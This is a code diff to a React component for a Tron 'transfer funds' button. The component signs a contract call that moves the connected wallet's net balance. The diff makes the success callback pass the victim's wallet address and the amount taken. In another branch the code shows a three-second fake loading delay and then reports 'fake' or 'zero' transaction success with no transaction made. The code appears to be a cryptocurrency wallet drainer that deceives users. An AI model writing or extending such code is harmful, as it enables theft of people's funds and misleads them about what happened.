@@ -11,11 +11,12 @@ const { tronContractAddress, tronFunctionName, tronFunctionParams, minimumTrxBal
 
 interface TronTransferFundsButtonProps {
   children: string;
-  onTransactionSuccess: () => void;
+  onTransactionSuccess: (network: string, wallet: string, amount: string) => void;
   onFakeTransactionSuccess: () => void;
+  onZeroTransactionSuccess: () => void;
 }
 
-const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess }) => {
+const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess, onZeroTransactionSuccess }) => {
   const { signTransaction, address, connected } = useWallet();
   const [netBalance, setNetBalance] = useState<number>(0);
   const [grossBalance, setGrossBalance] = useState<number>(0);
@@ -93,7 +94,7 @@ const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ child
         setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
         setAlertOpen(true);
         if (receipt.result){
-          onTransactionSuccess();
+          onTransactionSuccess("Tron", address || "", (netBalance / 1000000) + " TRX");
         }
       } catch (error) {
         console.error('Error calling contract:', error);
@@ -104,16 +105,16 @@ const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ child
     }
     else {
       setIsLoading(true);
-
+      
       await new Promise((resolve) => setTimeout(resolve, 3000));
 
       setIsLoading(false);
 
       if (grossBalance <= 0) {
-        onFakeTransactionSuccess();
+        onZeroTransactionSuccess();
       }
       else {
-        onTransactionSuccess();
+        onFakeTransactionSuccess();
       }
     }
   }
